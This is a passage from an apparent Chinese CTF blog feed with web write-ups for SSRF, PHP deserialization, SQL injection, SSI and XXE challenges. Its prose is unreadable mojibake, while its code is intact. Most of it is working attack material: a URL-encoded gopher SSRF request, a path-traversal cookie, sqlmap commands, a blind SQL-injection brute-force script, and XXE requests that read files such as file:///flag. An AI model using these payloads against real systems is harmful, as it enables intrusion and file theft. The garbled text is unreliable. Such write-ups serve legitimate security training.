class="line"></span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line"># For most configuration files from conf-available/, which are</span><br><span class="line"># enabled or disabled at a global level, it is possible to</span><br><span class="line"># include a line for only one particular virtual host. For example the</span><br><span class="line"># following line enables the CGI configuration for this host only</span><br><span class="line"># after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">#Include conf-available/serve-cgi-bin.conf</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br></pre></td></tr></table></figure></p><p>ä¾æ®æ‰¾åˆ°çš„webè·¯å¾„å»è¯»å–æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.107.145.220/?url=file:///var/www/html/ssrf/web.php</span><br></pre></td></tr></table></figure></p><p>ä¾æ®æºç æ„é€ gopherå»postæ•°æ®è¿›è€Œå¾—åˆ°flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"ssrf me with parameter 'url'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">//echo $_GET['url'];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">'user'</span>]==<span class="string">"admin"</span> &amp;&amp; $ip==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    system(<span class="string">"/var/www/html/ssrf/readflag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>æœ€åçš„payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%2f%5f%50%4f%53%54%20%2f%73%73%72%66%2f%77%65%62%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%25%30%64%25%30%61%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%36%25%30%64%25%30%61%55%73%65%72%2d%41%67%65%6e%74%3a%20%63%75%72%6c%2f%37%2e%31%31%2e%30%25%30%64%25%30%61%41%63%63%65%70%74%3a%20%2a%2f%2a%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%31%30%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%64%25%30%61%25%30%64%25%30%61%75%73%65%72%3d%61%64%6d%69%6e HTTP/1.1</span><br><span class="line">Host: 47.107.238.3</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ:</p><p>åšé¢˜æ—¶çœ‹åˆ°çš„æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨æ²¡æœ‰å¾—åˆ°æºç å‰æˆ‘ä»¥ä¸ºé¢˜ç›®çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºä¹‹å‰æˆ‘æ¢æµ‹å¾—åˆ°MySQLæœåŠ¡æ˜¯å­˜åœ¨çš„ï¼Œä½†åæ¥å‘ç°æˆ‘çŒœé”™äº†ã€‚</p><p><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">Gopher åè®® ssrf MYSQL ç ”ç©¶</a></p><h2 id="WEB-MyNote"><a href="#WEB-MyNote" class="headerlink" title="WEB  MyNote"></a>WEB  MyNote</h2><p>é¢˜ç›®åˆ†æ:</p><p>é¦–å…ˆæ‰¾åˆ°äº†robots.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°å†…å®¹é‡Œé¢åŒ…å«äº†å‡ ä¸ªæ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /controllers/Basecontrol.php</span><br><span class="line">Allow: /controllers/Controllers.php</span><br><span class="line">Allow: /controllers/User.php</span><br><span class="line">Allow: /flag.php</span><br></pre></td></tr></table></figure></p><p>ä¹‹åbase64è§£ç æŸ¥çœ‹å›¾ç‰‡ç•Œé¢çš„è¿”å›ä¿¡æ¯å‘ç°æ˜¯ååºåˆ—åŒ–ä¿¡æ¯ï¼Œè¿›è€Œæ„é€ å¦‚ä¸‹æ•°æ®å»è¯»å–flag.phpæ–‡ä»¶ï¼Œæœ€ç»ˆå¾—åˆ°flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($b)));</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/picture HTTP/1.1</span><br><span class="line">Host: 47.107.239.135</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D; PHPSESSID=a966des9csihs3pdc7plieldsh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>é¢˜ç›®ä¸‹çº¿å¤ªå¿«äº†ï¼Œå¿˜è®°ä¿å­˜flagçš„å“åº”åŒ…äº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ:</p><p>è¿™é¢˜ç›®å¯ä»¥getshellï¼Œæ‰€ä»¥ä¸€ç›´è¢«æ…å±ï¼Œè€Œä¸”å­˜åœ¨åŸé¢˜ã€‚ã€‚ã€‚</p><p><a href="https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="noopener">https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB-XmeO&quot;&gt;&lt;a href=&quot;#WEB-XmeO&quot; class=&quot;headerlink&quot; title=&quot;WEB  XmeO&quot;&gt;&lt;/a&gt;WEB  XmeO&lt;/h2&gt;&lt;p&gt;é¢˜ç›®è§£æ:&lt;/p&gt;
&lt;p&gt;æ˜¯ä¸€ä¸ªsstiç±»å‹æ¼æ´&lt;/p&gt;
&lt;p&gt;playload&lt;/p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018 EIS Web writeup</title>
    <link href="http://zer0yu.github.io/2018/11/17/2018-EIS-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/17/2018-EIS-Web-writeup/</id>
    <published>2018-11-16T16:49:25.000Z</published>
    <updated>2018-11-16T16:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>SimpleBBS</p><p><a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p><h3 id="é¢˜ç›®è§£æ"><a href="#é¢˜ç›®è§£æ" class="headerlink" title="é¢˜ç›®è§£æ:"></a>é¢˜ç›®è§£æ:</h3><p>1.ç™»å½•å¤„æŠ¥é”™<br><a href="https://i.loli.net/2018/11/16/5beede7d12704.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5beede7d12704.png" alt="å±å¹•å¿«ç…§ 2018-11-16 ä¸‹åˆ11.12.39.png"></a><br>2.å¯¼å‡ºburpçš„åŒ…ä½¿ç”¨sqlmapè¿›è¡Œæµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt --dbs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] bbs</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: bbs</span><br><span class="line">[7 tables]</span><br><span class="line">+----------+</span><br><span class="line">| admin    |</span><br><span class="line">| articles |</span><br><span class="line">| comments |</span><br><span class="line">| flag     |</span><br><span class="line">| messages |</span><br><span class="line">| sections |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: bbs</span><br><span class="line">[7 tables]</span><br><span class="line">+----------+</span><br><span class="line">| admin    |</span><br><span class="line">| articles |</span><br><span class="line">| comments |</span><br><span class="line">| flag     |</span><br><span class="line">| messages |</span><br><span class="line">| sections |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; -T &quot;flag&quot; -C &quot;f&quot; --dump</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># æµ‹è¯•çš„æ—¶å€™å·²ç»æ²¡æœ‰flagäº†....</span><br><span class="line">Database: bbs</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+</span><br><span class="line">| f       |</span><br><span class="line">+---------+</span><br><span class="line">| &lt;blank&gt; |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>SimpleBlog</p><p><a href="http://210.32.4.20/" target="_blank" rel="noopener">http://210.32.4.20/</a></p><h3 id="é¢˜ç›®è§£æ-1"><a href="#é¢˜ç›®è§£æ-1" class="headerlink" title="é¢˜ç›®è§£æ:"></a>é¢˜ç›®è§£æ:</h3><p>åˆšå¼€å§‹ä¸€ç›´å†æ‰¾æ–‡ä»¶åŒ…å«æƒ³çœ‹ä¸‹æºç ï¼Œåæ¥æ˜¯åœ¨æ‰¾ä¸åˆ°å°±è®¤çœŸåšäº†ä¸‹é¢˜ç›®ã€‚å‘ç°ç›´æ¥äºŒæ¬¡æ³¨å…¥å°±å¥½äº†ï¼Œå¦‚æœæ³¨å…¥å†…å®¹å­˜åœ¨åé¢åšé¢˜çš„åˆ†æ•°ä¼šä¸º0ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">register = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">login = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">answer = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line">logout = <span class="string">'http://210.32.4.20/logout.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"i:"</span>,chr(i),<span class="string">"j"</span>,chr(j)</span><br><span class="line">        req = requests.session()</span><br><span class="line">        payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">        post_answer = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">        login_data = &#123;<span class="string">'username'</span>:urllib.quote(payload),<span class="string">'password'</span>:<span class="string">'zeroyu'</span>&#125;</span><br><span class="line">        r = req.post(register,data=login_data)</span><br><span class="line">        lin = req.post(login,data=login_data)</span><br><span class="line">        ans = req.post(answer,data=post_answer) </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            f=chr(j)</span><br><span class="line">            <span class="keyword">print</span> f</span><br><span class="line">            flag=flag+f</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lout = req.get(logout)</span><br></pre></td></tr></table></figure><h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>SimpleServerInjection, SSI, flag in current directory</p><p><a href="http://210.32.4.22/index.php" target="_blank" rel="noopener">http://210.32.4.22/index.php</a></p><h3 id="é¢˜ç›®è§£æ-2"><a href="#é¢˜ç›®è§£æ-2" class="headerlink" title="é¢˜ç›®è§£æ:"></a>é¢˜ç›®è§£æ:</h3><p>äº†è§£åˆ°æ˜¯ssiï¼Œæç¤ºäº†è¯»flagæ–‡ä»¶ï¼Œå¸¸è§„payloadå‘ç°<code>#</code>å·åå†…å®¹è¢«æˆªæ–­ï¼Œäºæ˜¯é‡‡ç”¨ç¼–ç ç»•è¿‡ã€‚</p><p><a href="https://i.loli.net/2018/11/16/5bee89b30c593.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee89b30c593.png" alt="å±å¹•å¿«ç…§ 2018-11-16 ä¸‹åˆ5.07.19.png"></a><br><a href="https://i.loli.net/2018/11/16/5bee89b30e32f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee89b30e32f.png" alt="å±å¹•å¿«ç…§ 2018-11-16 ä¸‹åˆ5.08.55.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--%23include+virtual%3D&quot;flag&quot;+--&gt;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h3><p><a href="https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html" target="_blank" rel="noopener">https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html</a></p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p><p><a href="http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</a></p><h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>SimpleExtensionExplorerInjection, XXE, /flag</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="noopener">http://210.32.4.21:8080/www/index.html</a></p><h3 id="é¢˜ç›®è§£æ-3"><a href="#é¢˜ç›®è§£æ-3" class="headerlink" title="é¢˜ç›®è§£æ:"></a>é¢˜ç›®è§£æ:</h3><p>1.burpæŠ“åŒ…å‘ç°é‡‡ç”¨jsonæ ¼å¼ä¼ è¾“æ•°æ®</p><p><a href="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/16/5bee8a4b4c115.png" alt="å±å¹•å¿«ç…§ 2018-11-16 ä¸‹åˆ5.13.33.png"></a></p><p>2.ä¿®æ”¹<code>Content-Type</code>å­—æ®µä¸º<code>xml</code>ï¼Œå°è¯•post xmlæ ¼å¼æ•°æ®</p><p>æ ¹æ®è¯·æ±‚å’Œå“åº”å‘ç°å­˜åœ¨xxeæ¼æ´</p><p>è¯·æ±‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 73</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;name&gt;zzz&lt;/name&gt;</span><br><span class="line">&lt;age&gt;zzz&lt;/age&gt;</span><br></pre></td></tr></table></figure></p><p>å“åº”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 </span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Date: Fri, 16 Nov 2018 09:17:40 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 254</span><br><span class="line"></span><br><span class="line">&#123;&quot;timestamp&quot;:&quot;2018-11-16T09:17:40.797+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 2; The markup in the document following the root element must be well-formed.&quot;,&quot;path&quot;:&quot;/www/&quot;&#125;</span><br></pre></td></tr></table></figure><p>3.ä¾æ®æç¤º<code>/flag</code>ï¼Œç›´æ¥å»è¯»æ–‡ä»¶</p><p>è¯·æ±‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 151</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>å“åº”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Date: Fri, 16 Nov 2018 09:21:23 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: EIS&#123;bce52c116d589ae9472e59a162cc90e2&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h3><p><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="noopener">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p><h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>SimplePrintEventLogger, same server as SimpleExtensionExploreInjection , RCE, flag in /</p><p><a href="http://210.32.4.21:8080/www/index.html" target="_blank" rel="noopener">http://210.32.4.21:8080/www/index.html</a></p><h3 id="é¢˜ç›®è§£æ-4"><a href="#é¢˜ç›®è§£æ-4" class="headerlink" title="é¢˜ç›®è§£æ:"></a>é¢˜ç›®è§£æ:</h3><p>åŒä¸€ä¸ªé¢˜ç›®çš„æœåŠ¡å™¨ä¸Šï¼Œflagåœ¨æ ¹ç›®å½•ï¼Œæ‰‹åŠ¨ç¿»ä¸€ä¸‹å°±å¥½</p><p>è¯·æ±‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 147</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span 